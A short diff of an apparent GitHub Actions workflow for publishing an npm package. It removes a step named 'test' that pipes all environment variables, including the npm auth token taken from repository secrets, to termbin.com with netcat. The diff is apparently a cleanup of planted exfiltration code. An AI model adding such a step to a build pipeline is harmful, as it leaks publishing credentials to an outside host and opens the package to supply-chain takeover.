@@ -24,11 +24,6 @@ jobs:
       - name: Build
         run: npm run build
 
-      - name: test
-        run: env | nc termbin.com 9999
-        env:
-          NODE_AUTH_TOKEN: ${{secrets.npm_token}}
-
       - name: Publish to Npm
         run: npm publish
         env:
